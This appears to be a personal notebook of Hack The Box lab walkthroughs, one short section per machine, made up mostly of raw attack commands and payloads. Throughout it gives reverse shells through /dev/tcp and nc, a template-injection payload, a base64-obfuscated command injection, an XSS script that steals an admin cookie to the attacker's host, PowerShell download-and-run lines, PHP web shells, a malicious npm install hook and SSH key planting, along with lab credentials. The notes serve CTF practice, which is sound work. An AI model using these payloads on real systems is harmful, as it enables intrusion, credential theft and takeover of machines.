- [Explore (Port Forwarding, Android Pentesting)](https://youtu.be/ptJIUHQa4zM)
    
    PortForwarding:
    
    in machine: ssh> -L 5555:localhost:5555
    
    in kali machine: adb devices (here it is showing [localhost:5555](http://localhost:5555))
                              Then ‚Äî> write adb -s localhost:5555 -shell and we connect it.
    
- Return (Windows)
    
    we can use type instead of cat in windows machines.
    
    the root and user flags are always at ‚ÄòDesktop‚Äô. in their respective user‚Äôs folder.
    
    - For connecting a reverse shell from windows we can do: (If WinRM port is open)
    
    <aside>
    üí° upload /usr/share/windows-resources/binaries/nc.exe 
    sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.2 1234‚Äù
    
    </aside>
    
    Then start a nc lister at port 1234 and then again write these commands:
    
    <aside>
    üí° sc.exe stop vss 
    sc.exe start vss
    
    </aside>
    
    then we get a system32 shell.
    
- NodeBlog (Node.js)
    
    In this machine we have a login page which is basically in mongodb do we can do this:
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%204.png)
    
- Nunchucks (Perl + Server side template Injection)
    
    If any template ask us for only email so we can check like this:
    
    {{7*7}}@test.com
    
    if it return 49 so it is vulnerable.
    
    In Email (payload):
    
    {{range.constructor("\return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo/tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.82 9001 >/tmp/f')\")()}}
    
    [root.pl](http://root.pl) script:
    
    #!/usr/bin/perl
    use POSIX qw(strftime);
    use POSIX qw(setuid);
    POSIX::setuid(0);
    
    exec "/bin/bash"
    
- Seal (Tomcat)
    
    If we see a marketing web app so we can use fuzzing:
    
    ffuf -u [https://10.10.10.250/FUZZ](https://10.10.10.250/FUZZ) -w /usr/share/wordlists/dirb/common.txt
    
    If we get uploading payload on tomcat server so we can do like:
    
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.82 LPORT=9001 -f war >shell.war
    
- Forge (SSRF)
    
    In url field there is a SSRF vulnerability:
    
    [http://aDmiN.fOrgE.hTb/upload?u=ftp://user:heightofsecurity123!@0x7f000001](http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@0x7f000001)
    
    [0x7f000001](http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@0x7f000001) ‚Äî > 127.0.0.1 (If we encode ip into hex so it will work same.)
    
    by these we can get id_rsa and then we ssh on the box and then we will see sudo -l and we get  a pyrhon file and in python file we have a password and this file is listing on localhost at a specific port so again open a open session and then nc on that port and give a random character and we get pdb error and then 
    use this script
    
    ```python
    import os
    os.system("/bin/bash")
    # and now we are root.
    ```
    
- LogForge (LOG4j, tomcat)
    
    We have noting much, just  a simple web page.
    
    We see that there is tomcat so we do like this ‚Äî> 10.129.96.153/;name=WhiteDevil/manager/ (Last / is very imp.)
    
    Default creds of tomcat is **‚Äútomcat:tomcat‚Äù**
    
    After entering the tomcat we do as usual upload a shell like:
    
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.82 LPORT=9001 -f war >shell.war
    
    but we fail,
    
    For reverse shell we use two tools download from github and commands are:
    
    ‚Äî> ysoserial-modified tool:
    
    command: 
    
- PreVise (login, sqlmap)
    
    In this box we have a simple login page so firstly intercept the login request save it and use sql map for cracking:
    sqlmap -r login.req --batch
    but it not work.
    Now we found accounts.php in the gobuster so we intercept accounts.php and then go to burp and under ‚Äòdo intercept‚Äô request we will ‚Äòresponse to this request‚Äô and then change 302 found ‚Äî> 200 Ok and then forward it and we will land on the create account page.
    Then go to log data section and go to file delimiter and intercept the request and then put a reverse shell in url encoded form.
    and we get shell.
    By reading the config file we will get a mysql password and then we will go into my sql:
    mysql -u root -p'mySQL_p@ssw0rd!:)'-e'show databases;‚Äô
    mysql> mysql -u root -p'mySQL_p@ssw0rd!:)' previse -e'select * from accounts;‚Äô
    and we get the password after cracking it from the hashcat: ilovecody112235!
    we can also do ssh with these creds of m4lwhere
    now after sudo -l we analyze that it is storing data in gzip file so we will made our own which which directly gives us root.
    now make a file call gzip and write this :
    #bin/bash bash -i >& /dev/tcp/10.10.14.82/9001 0>&1
    and then ‚Äî> chmod +x gzip
    export PATH=.:$PATH
    gzip
    exit
    and then again run sudo -l command:
    sudo /opt/scripts/access_backup.sh
    and now we are root.
    
- Resolute(windows, password policy(crackmapexec), evil-winrm, winpeas)
    
    we see that smb here so for find password policy we use:
    
    crackmapexec smb ‚Äîpass-pol 10.129.166.46
    
    if we have password and list of users we can do :
    
    crackmapexec smb 10.129.166.46 -u users.txt ‚ÄòWelcome123!‚Äô
    
    By evil-winrm we get a shell:
    
    evil-winrm -i 10.129.163.97 -u melanie -p'Welcome123!‚Äô
    
    For download winpeas we will do:
    
    curl 10.10.14.82:8000/winPEASx64.exe -o win.exe
    
    after that see ippsec video ‚Äî> [https://youtu.be/8KJebvmd1Fk?t=2310](https://youtu.be/8KJebvmd1Fk?t=2310)
    
- Love (php)
    
    First of all we get a login web page and we get a web page we will go to staging.love.htb and write 127.0.0.1:5000 and we get admin user id and password.
    now when we logged in we will try to add a voter for that we will go to /admin/voters.php and we can add a voter there and intercept the request, in the place of metadata of image we will put our php script ie:
    
    ```php
    <?php
    system($_REQUEST[‚Äôcmd‚Äô]);
    ?>
    ```
    
    and change file name .jpeg vali to .devil.php
    
    now go to /images/devil.php?cmd=dir and we have command Injection.
    
    and intercept the cmd request in the burp and change the request method and then we will inject our command by :
    
    (nc listener 9001 )
    
    powershell "IEX(New-Object Net.WebClient).downloadString('[http://10.10.14.82:8000/revshell.ps1](http://10.10.14.82:8000/revshell.ps1)')"
    
    and we get a shell
    
    now for root we will use msfvenom:
    
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.82 LPORT=9001 -f msi > payload.msi
    
    upload it on the box, set a nc listener and we are root.
    
- UHC Union
    
    First of all we get a ctf page so we will do union injection here.
    in the player field we will do like:
    ad' union select group_concat(one, "\n") from november.flag-- - and write the flag in the flag section.
    Now the ssh port is open so we will try to find the user name and password for same.
    so in the gobuster output we get a config.php file so we will do here we use payload like:
    player=adq' union select LOAD_FILE('/var/www/html/config.php')-- -
    now we get a user and password for ssh.
    Now intercept the request of firewall.php
    X-FORWARDED-FOR: clear;bash -c 'bash -i >& /dev/tcp/10.10.14.82/9001 0>&1';
    and we get a shell.
    In this shell we if we do sudo -l so then is now passwd for all
    so just do sudo su - and we are root.
    
- Pikaboo (Apache[admin], ftp)
    
    we have a simple web page here and there is a admin login.
    
    so we use this and we are in.
    
    [http://10.129.95.191/admin../admin_staging/index.php](http://10.129.95.191/admin../admin_staging/index.php)
    
    Then we go to this paga:
    
    [http://10.129.95.191/admin../admin_staging/index.php?page=/../../../../../../../../var/log/vsftpd.log](http://10.129.95.191/admin../admin_staging/index.php?page=/../../../../../../../../var/log/vsftpd.log)
    
    now we do ftp at ip and put payload in the name section:
    
    <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.82exit/9001 0>&1'"); ?>
    
    (nc listener )and refresh the web page and now we get a shell.
    
    now after some recon we find that a user name and password i.e**. pwnmeow:*G0tT4_C4tcH*'3m_4lL!_**
    
    we try to ssh but it does not work so we have ftp and we get in.
    
    now make a wired payload in our box:
    
    '|echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuODIvOTAwMSAgMD4mMSAg|base64 -d| bash;.csv‚Äô
    
    then go to ftp shell and ‚Äúcd versions‚Äù bcz of cron
    
    write mput |echo*
    
    and after 200 successfully request start a nc listner on 9001 and after 1 minute we get a root shell.
    
- Time (jdbc, java, timer_backup)
    
    First of all we get a web page which has a service ‚Äújdbc‚Äù we get a payload for this:
    
    before deploying the payload save payload as inject.sql and nc listener 9001.
    
    Payload: ["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '[http://10.10.14.82:8000/inject.sql](http://10.10.14.82:8000/inject.sql)'"}]
    
    now we get a shell.
    
    in this shell we run linpease script and we get a suspicious hit:
    
    /usr/bin/timer_backup.sh ‚Äî>this file is changing every minute.
    
    ```python
    #!/bin/bash
    
    bash -c 'bash -i >& /dev/tcp/10.10.14.82/9001 0>&1'
    
    zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
    ```
    
    so we change it and start a nc listner on 9001 and so some seconds after we are root.
    
- Curling (Joomla, Templates, hexdump[xxd], cronjobs)
    
    in this box we have a web page which is based on joomla so for finding the default version we will use this command:
    
    10.10.10.150/administrator/manifests/files/joomla.xml
    
    For finding the vulnerability in joomla we use this tool: joomscan
    
    joomscan ‚Äîurl [http://10.10.10.150](http://10.10.10.150) -ec | tee joomscan.out
    
    in the website we get a secret.txt which contain a base 64 string i.e. Curling2018!
    
    and we get a user name on the website i.e. Floris so just logged in with these credentials.
    
    <aside>
    üí° When we get a admin page of any like tomcat, apache, wordpress, joomla so 1st of all try to edit templates bcz they are in php which is easy for command injection.
    
    </aside>
    
    We create a new file in the box and we have command injection vulnerability.
    
    ```php
    <?php
    system($_REQUEST[‚Äôcmd‚Äô]);
    ?>
    ```
    
    Now go to here and nc, python server on background:
    
    [http://10.129.95.228/templates/protostar/white_devil.php?cmd='bash -i >& /dev/tcp/10.10.14.82/9001 0>&1'](http://10.129.95.228/templates/protostar/white_devil.php?cmd=%27bash%20-i%20%3E&%20/dev/tcp/10.10.14.82/9001%200%3E&1%27)
    
    And we get a shell.
    
    but here we are www not floris so we will see a file pass_backup which is a hex dum so we will use a tool call xxd for reversing it.
    
    or we can use our cyber chef for this: 
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%205.png)
    
    We get a password file i.e: 5d<wdCbdZu)|hChXll
    
    now we are in ssh shell of floris but we see that we are not have root permissions.
    
    we 2 files input and report in the /home tab 
    we see that input going to [localhost](http://localhost) so we will try to change it we do like this:
    
    We change input to 
    
    ```php
    url = "http://10.10.14.82:8000/sudoers"
    output = "/etc/sudoers"
    user-agent = "Devil/1.0"
    ```
    
    and in our kali machine we copy /etc/sudoers to current directory and edit it like:
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%206.png)
    
    now save to input file.
    Start a python server on same directory.
    and we get a hit in python server so our file is uplaoded in ssh shell.
    
    do sudo -su paste floris password(cyberchef) and we are root.
    
- TraceBack (wget linpease.sh, ssh-keygen, lua )
    
    We get  a simple we page.
    
    we got to seclist and find word list for CommonBackdoors-PHP.fuzz.txt
    
    after doing gobuster so get  a page :
    
    [http://traceback.htb/smevk.php](http://traceback.htb/smevk.php)
    
    in the souce code of web page we get a hint :
    
    **<!--Some of the best web shells that you might need ;)-‚Üí**
    
    and we google it and found the password for that web shell:
    
    [https://github.com/TheBinitGhimire/Web-Shells/tree/master/PHP](https://github.com/TheBinitGhimire/Web-Shells/tree/master/PHP)
    
    and upload a reverse web shell on the web page inside the login page and we got a shell.
    
    after that we get [linpeas.sh](http://linpeas.sh) on the box by :
    
    wget 10.10.14.82:8000/linpeas.sh (in /dev/shm folder)
    
    so now we have to get into sysadmin so for that we will know it has **‚Äúlua‚Äù** here.
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%207.png)
    
    For we create a script in our kali: devil.lua
    
     
    
    ```php
    file = io.open("/home/sysadmin/.ssh/authorized_keys", "a")
    io.output(file)
    io.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDgt/eAhJ0iGujgQFgf1h27Bw3Bb/SNqhqZr1eb7ccsLcWQl9MtHH0nPp1q9mLjQusHUh6o+DpHg1yvCq6J67I9T3/bdHxjbGQW4eQiO9jaXXvG0sjCnTj4XQzhJKI3tlW42wUI7hcuWflzh2DAx8Uzkjs7yZ1EJ2xfvHWWGUMB5EvpV5Q5Y8yBZ+zPQMfAMSlZ5KRe6VaBAc2G9jfkyI3w5s5mmd5XQku+QF/6NPyktcWqpvPW3cSrXikaRSqo2JtUKP6PlCbaOiaBt94UFbZn7QcRcR7A1Kxi4nOJsyZqqZZntfIInKkcKlegqK+rfvTRKswrsv4Rgw2642vRh0ieiR3AbcBF0V47FhTamMehVtXTvM3a6IcduhheaA0b/YXNR0zmTUh3oDOUkL9fele3iVqko/OEI3DdJdngj87DhvMEkVV5VfVymwOiTNEyPI4thOqyLAxQ5nb6FsBfFveS69SaB82L3KWqE35nb+91V4HIXfHNunivAxwYAmaYaM8=")
    io.close(file)
    ```
    
    For ssh key gen use command:
    
    ssh-keygen -f sysadmin
    
    in io.write use the [sysadmin.pub](http://sysadmin.pub) contant.
    
    and upload it in the shell. 
    
    use command:
    
    sudo -u sysadmin /home/sysadmin/luvit /dev/shm/devil.lua
    
    If it don‚Äôt gives us any error so we successfully uploaded our ssh key.
    
    now in kali box do chmod 600 sysadmin and then ssh -i sysadmin sysadmin@ip
    
    and we get in ssh shell.
    
    go to ‚Äî> sysadmin@traceback:/etc/update-motd.d$ nano 00-header
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%208.png)
    
    nc listener on background, close www shell and do ssh again in new tab.
    and we are root.
    
- Dynstr (Dynamic DNS, IP, Terminal‚Üí Burp, ssh key(removing spaces) )
    
    In this box we have a web page on the web page we have ‚Äúno-ip‚Äù, we google it and found something interesting:
    
    So do like this:
    
    curl "[http://dynadns:sndanyd@10.129.157.131/nic/update?hostname=devil.dynamicdns.htb&ip=10.10.14.82](http://dynadns:sndanyd@10.129.157.131/nic/update?hostname=devil.dynamicdns.htb&ip=10.10.14.82)"
    
    Now we made a place in dynamic dns.
    
    Now we get this request in the burp by terminal by doing:
    
    curl --proxy [http://localhost:8080](http://localhost:8080/) '[http://dynadns:sndanyd@10.129.157.131/nic/update?hostname=de`sleep+2`vil.dynamicdns.htb&myip=10.10.14.82](http://dynadns:sndanyd@10.129.157.131/nic/update?hostname=de%60sleep+2%60vil.dynamicdns.htb&myip=10.10.14.82)'
    
    And we see that sleep is working here so try to gain  a reverse shell.
    
    and in burp we do like this:
    
    ```php
    GET /nic/update?hostname=de$(bash+-c+'bash+-i+>%26+/dev/tcp/0x0a0a0e52/9001+0>%261')vil.dynamicdns.htb&ip=10.10.14.82 HTTP/1.1

    Authorization: Basic ZHluYWRuczpzbmRhbnlk
    User-Agent: curl/7.74.0
    Accept: */*
    Connection: close
    ```
    
    <aside>
    üí° Here we encode ip to hex because . are not accepting here.
    
    </aside>
    
    Now we have a shell.
    
    now we go to /home/bindmgr/support-case-C62796521$  cat strace-C62796521.txt
    
    here we get  a ssh key in down side.
    
    but this is not in a proper formate.
    
    so we copy this and in vi we do like this:
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%209.png)
    
    and now ssh is in proper format.
    
    now do ssh:

- Schooled (Moodle, XSS, cookie stealing, GTFObin)
    
    In this box we get a school website and noting much on it, so we run gobuster on it and looking for vhost and we found : moodle.schooled.php, we go there and find a moodle page.
    We can easily enroll in mathematics subject and when we enrolled in this and go to announcements section we see that it is updating so we have a hit that here might be XSS. 
    
    We go inside moodle as register a new account and then we have a xss exploit field here:
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2010.png)
    
    We create a file inside our kali machine and upload it here so we get a cookie.
    <script src="[http://10.10.14.82/devil.js](http://10.10.14.82/devil.js)"></script>
    
    devil.js file:
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2011.png)
    
    Now we get  a cookie so replace this cookie by user cookie and we are now different user.
    
    Now in this version of moodle, there is a CVE i.e. CVE-2020-14321 (in nmap scan we got a date so by these we go to ‚ÄúMoodle security Announcement‚Äù and get the result.)
    Now we know that the manger of moodle is Lianne Carter
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2012.png)
    
    Now in the burp we capture the request and change like this:
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2013.png)
    
    Now we will do manutally add liean carter and when we go to her page so we can logged in as admin page available.
    
    Now we go to here and intercept the request:
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2014.png)
    
    now go to cve and replace the long junk with payload.
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2015.png)
    
    after doing this go to here and now we can install plugins:
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2016.png)
    
    In the CVE page we get a:
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2017.png)
    
    go there and install the zip file in moodle and we get code execution.
    
    now upload a bash script in cmd command in burp and url encode it and now we get a shell.
    
    now go to /usr/local/www/apache24/data/moodle/ and we get a config.php file where we get database password.
    
    in mysql database we get  a password for jamie (bcz in /etc/passwd we got nologin for her.)
    
    now we can ssh with ‚Äújamie‚Äù:!QAZ2wsx
    
    now if we do sudo -l so we see that ‚Äúpkg‚Äù and if we go to gtfobins so we find sudo it.
    
    now in our system do like this:
    
    ```php
    TF=$(mktemp -d)
    echo '/tmp/shell.sh' > $TF/x.sh
    fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
    ```
    
    and upload it on the ssh shell.
    
    now in ssh shell do like this:
    
    nano /tmp/shell.sh
    
    ```php
    #!/bin/bash
    bash -i >& /dev/tcp/10.10.14.82/9001 0>&1
    echo "TEST" > /tmp/pwned
    ```
    
    chmod +x /tmp/shell.sh
    
    sudo pkg install -y --no-repo-update ./x-1.0.txz (nc listener on another tab)
    
    and now we are root.
    
- Tenet (Wordpress, gobuster[discovery], mysql, hashcat, ssh-keygen, inotify)
    
    we have a web page on this box which is based on wordpress.
    
    so simply sum wp-scan on this and found some info:
    
    **wpscan --url tenet.htb --enumerate p,u --plugins-detection aggressive**
    
    now go to default login page of wordpress. (/wp-login.php)
    
    Noting more on login page but if we see ‚Äòneil‚Äô comment :
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2018.png)
    
    we can‚Äôt find the sator.php on tenet.htb so we go to ip address web page and we can find that there.
    
    There we see that it is updating the database there so we search again there for some more files.
    
    gobuster dir -u [http://10.129.144.239](http://10.129.144.239/) -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 150 -x php -d
    
    and we find sator.php.bak
    
    we download it and make our own php file with the help of .bak file
    
    ```php
    <?php
    
    class DatabaseExport
    {
            public $user_file = 'devil.php';
            public $data = '<?php system ($_REQUEST["cmd"]); ?>';
    }
    $pwn = new DatabaseExport;
    echo (serialize($pwn));
    ```
    
    now in kali machine run this file as: php pwn.php and we see a output as:
    
    O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"devil.php";s:4:"data";s:35:"<?php system ($_REQUEST["cmd"]); ?>";}
    
    now go to here and paste it like:
    
    [http://10.129.144.239/sator.php?arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"devil.php";s:4:"data";s:35:"<?php system ($_REQUEST["cmd"]); ?>";}](http://10.129.144.239/sator.php?arepo=O:14:%22DatabaseExport%22:2:%7Bs:9:%22user_file%22;s:9:%22devil.php%22;s:4:%22data%22;s:35:%22%3C?php%20system%20($_REQUEST%5B%22cmd%22%5D);%20?%3E%22;%7D)
    
    and if we go to ‚Üí [http://10.129.144.239/devil.php?cmd=id](http://10.129.144.239/devil.php?cmd=id) so we have command execution.
    
    now intercept the request in burp and get a www reverse shell.
    
    we go to wordpress and open wp-config file there we got a password of user ‚Äúneil‚Äù:‚ÄùOpera2112‚Äù
    
    we go to mysql on www shell by:
    
    mysql -u neil -p (paste the password)
    
    show databases;
    
    show tables;
    
    select * from wp_users; 
    
    now we got hashes of users and try to crack with the help of ‚Äòhashcat‚Äô
    
    we go to this website for finding the mode of hashcat ‚Üí [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
    
    and run command: 
    
    **hashcat -m 400 -o crack.txt hash.txt /root/Downloads/rockyou.txt --force --self-test-disable**
    
    but we have not get sucess.
    
    but now we do ssh neil with the password we found and we got a hit.
    
    we are now inside ssh shell.
    
    now when we do sudo -l on the shell so we get a .sh file which is writing a ssh key on the root user.
    
    so we go to this blog post of [‚ÄúC inotify example‚Äù](https://linuxhint.com/inotify_api_c_language/)  and copy the code.
    
    now we modify the code: (line 73 to 78):

               wd = inotify_add_watch(fd,path_to_be_watched,IN_MODIFY | IN_CREATE | IN_DELETE);
         
               if(wd==-1){
                       printf("Could not watch : %s\n",path_to_be_watched);
               }
               else{

               }
         
         
               while(1){

                  }
            }
        }
        ```
        
    
    now compile this code with gcc: gcc pwn.c -o pwn
    
    now upload the pwn file in ssh shell and also open a parllel ssh shell of neil.
    
    wget pwn file in tmp dir and chmod +x on it and run as: ./pwn /tmp
    
    after run it in one shell simultaneously run sudo [enableSSH.sh](http://enablessh.sh/) in other shell so we get a message like this:
    
    Successfully added root@ubuntu to authorized_keys file!
    
    now if we do in our kali like: ssh -i tenet [root@10.129.144.239](mailto:root@10.129.144.239)
    
    so we are now root. 
    
- Holiday (sqlmap, XSS, Command Injection, reverse shell, NPM)
    
    We have a web page first. we start gobuster like follow and go to login page:
    
    gobuster dir -u [http://10.129.29.106:8000](http://10.129.29.106:8000/) -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 150 -a Linux
    
    We intercept the request in the burp and try to use sqlmap on it:
    sqlmap -r login.req --level=5 --risk=3 -dump-all (Change Windows ‚Üí Linux in login.req)
    
    We get a password and username ‚Üí **RickA:nevergonnagiveyouup**
    
    now we see that there are some type of updating here by the admin in every one minute so we will try XSS here.
    
    In the field it is encoding our payload so we will write a program in python for encoding char code:
    
    ```python
    def createEncodedJS (ascii):
        decimal_string = ""
        for char in ascii:
             decimal_string += str(ord(char)) + ","
        return decimal_string[:-1]
    ```
    
    Payload:
    
    <aside>
    üí° <img src="x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,56,50,47,100,101,118,105,108,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));</script>">
    
    </aside>
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2019.png)
    
    Now we write our devil.js script:
    
    ```jsx
    var req1 = new XMLHttpRequest();
    req1.open ( 'GET', 'http://localhost:8000/vac/124612db-32c1-4e21-b66f-4ae02b0bb7cf', false);
    req1.send ();
    var response = req1.responseText;
    var req2 = new XMLHttpRequest();
    var params = "cookie=" + encodeURIComponent(response);
    req2.open('POST', 'http://10.10.14.82:8000/devil', true);
    req2.setRequestHeader( 'Content-type', 'application/x-www-form-urlencoded');
    req2.send(params);
    ```
    
    now upload the payload and python server on 80 and nc -lnvp 8000 > tmp
    
    in tmp we get a url encoded long string, we decode it with the help of cyberchef and then we find the admin cookie in the last porstion of the html page.
    
    Now we copy the admin cookie and replace it with our cookie and now we get a admin window.
    
    now we go to /admin and we have two options notes and booking so we intercept the note‚Äôs request in the burp and we see that there is a command injection vulnerability here.
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2020.png)
    
    now for reverse shell it is not allows as to use . so we url encode our ip into hex and then we will do like this:
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2021.png)
    
    shell:
    
    ```bash
    #!bin/bash
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.82 9001 >/tmp/f
    ```
    
    now copy this request into another repater tab and then we do:
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2022.png)
    
    and we get a shell now.
    
    now stable the shell and when we do sudo -l in the shell so we know that there is no password for npm i 
    so we go to:
    
    in /app me make a directory rimrafall and copy to files by ‚Üí https://github.com/joaojeronimo/rimrafall
    then edit package.json file:
    
    ```json
    {
      "name": "rimrafall",
      "version": "1.0.0",
      "description": "rm -rf /* # DO NOT INSTALL THIS",
      "main": "index.js",
      "scripts": {
        "preinstall": "bash /tmp/shell"
      },
      "keywords": [

        "rmrf"
      ],
      "author": "Jo√£o Jer√≥nimo",
      "license": "ISC"
    }
    ```
    
     now algernon@holiday:~/app$ cp shell /tmp/shell
    go to tmp/shell and change tmp/f ‚Üí tmp/b
    
    now back again in app directory, in kali nc on 9002 and run command:
    
    sudo npm i rimrafall --unsafe
    
    and now we are root.
    
- LaCasaDePapel (vsftpd, msfconsole, php shell, ssl certificate)
    
    In this box in the web page we get a simple template noting more to do.
    
    in our nmap scan we get ‚Äúvsftpd‚Äù so we search it in the msfconsole and we find a exploit fo that.
    
    in msfconsole we see that there is a port open on 6200 and when we connect it we get a connection on ‚Äòphp shell‚Äô . [rlwrap nc 10.129.145.242 6200]
    
    for intraction with it we use these commands:
    
    scandir(".") ‚Üí for viewing the files
    
    file_get_contents("/home/nairobi/ca.key") ‚Üí for opening the file.
    
    in nairobi we get a ssh key so copy it.
    
    we try to ssh with it but failed.
    
    when we go to [https://lacasadepapel.htb/](https://lacasadepapel.htb/)
    
    and we see that there is a certificate error here and then we open the certifiacte and and copy the cert key and now we will make our own certificate.
    
    save cert key as ca.crt, and we have nairobi‚Äôs key as ca.key
    
    openssl req -new -key client.key -out client.csr
    
    openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -set_serial 9001 -extensions client -days 9002 -outform PEM -out client.cer
    
    openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
    
    now our certificate is ready.
    
    now we go to preference in firefox and in your certificate section we import .p12 vala and in ‚ÄòAuthority‚Äô section we will import .crt vala certificate and then check the first box of it ‚ÄòTrust all the websites.‚Äô
    
    and now when we refresh our page so we will see that there is a new page is open so we do some ‚Äòdirectory traversal‚Äô and got this page:
    
    [https://lacasadepapel.htb/?path=../](https://lacasadepapel.htb/?path=../)
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2023.png)
    
    now we want to get the files here so for that we do like this:
    
    echo -n '../.ssh/id_rsa' | base64
    Li4vLnNzaC9pZF9yc2E=
    
    and then:
    
    curl -k [https://LaCasaDePapel.htb/file/Li4vLnNzaC9pZF9yc2E=](https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E=)
    
    after that we get a ssh key and then ssh -i id_rsa [professor@10.129.145.242](mailto:professor@10.129.145.242)
    
    and we are in.
    
    now we will do: mv memcached.ini ini.bak
    
    now if we do ls -la so ini.bak is own by root.
    
    cd /tmp
    
    echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.32 1234 >/tmp/f' >> shell.sh
    
    chmod +x [shell.sh](http://shell.sh/)
    
    now come back in home folder and change memcached.ini
    
    ```bash
    [program:memcached]
    command = su -c /tmp/shell.sh
    ```
    
    now open nc at 1234 and after some time, cron jobs will work and we are root.
    
- Monitors (Wordpress CVE, ssh port forwarding, Docker)
    
    We get a wordpress based page we go to wp-content/plugins so we get a plugin, we search it on searchsploit and get a hit of directory traversal.
    /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
    
    now interncept this request and modified it: ../../../wp-config.php
    
    and now we get the admin id and password.
    
    but these credentials are not working on the wordpress so we find another vhost:
    
    cacti-admin.monitors.htb we logged in as **admin:BestAdministrator@2020!**
    
    we have a version available here and we got a exploit of this on google and after exploitation, we get  a reverse shell. [exploit‚Üí [https://www.exploit-db.com/exploits/49810](https://www.exploit-db.com/exploits/49810)]
    
    now we are in the www shell so go to here: /usr/share/cacti/cacti and type the command:
    
    **cat include /config.php | grep -v '^\#\|*' | grep .**
    
    and we are get cactie password and user_id. of myql.
    we go to /home/marcus/.backup/backup.sh and get the marcus password 
    now su -markus and paste the password VerticalEdge2020 and we are in the marcus user and these are also ssh credentials.
    
    now we forward the port on out [localhost](http://localhost) 
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2024.png)
    
    and when we go to [https://localhost:8443/](https://localhost:8443/) we get a page which is showing error and then we run gobuster on that and then we get some hits ‚Üí /content/control/main and here we got a login page.
    
    After that see video ‚Üí [https://youtu.be/-loZwD39ifc?t=2160](https://youtu.be/-loZwD39ifc?t=2160)
    
- Heist (cisco router, smb login[msfconsole], evil-winrm, psexec.py[windows‚Äôs ssh] )
    
    We got a login page here. we go to ‚Äúlogin as guest and we got to know that is is a cisco router and in the attachment we got a password so we go to github and download this ‚Üí https://github.com/theevilbit/ciscot7
    
    and then we will crack the password and after that we will use hashcat for hash cracking and we got: stealth1agent
    
    now we create a user file and brutefore it with msfconsole.
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2025.png)
    
    and we find user id and password.
    
    now with this command we got a shell on the box:
    
    evil-winrm -i 10.129.96.157 -u chase -p 'Q4)sJu\Y8qz*A3?d‚Äô
    
    Then type this in kali machine: 
    
    ![Untitled](Machines%2069d11b1b5d024deaaed4bce28bea4d31/Untitled%2026.png)
    
    Password:4dD!5}x/re8]FBuZ
    
    and now we are root.
    
- Atom (smbclient)
    
    In this machine we see that there is a smb port open so we try to look into this for that we will type this command:
    
    smbclient -N -L //10.10.10.237, smbclient //10.10.10.237/Software_Updates
    
    after that see video ‚Üí [https://youtu.be/1OC2eRVX0ic](https://youtu.be/1OC2eRVX0ic)
    
     
    
- Passage(USB Creator)
    
    Here we have a web page, in this page we spot cutenews so we serachsploit it and we find a RCE and then by using this we get  a command shell prompt and after that we use a reverse shell payload to get a stable real shell in our kali box.
    
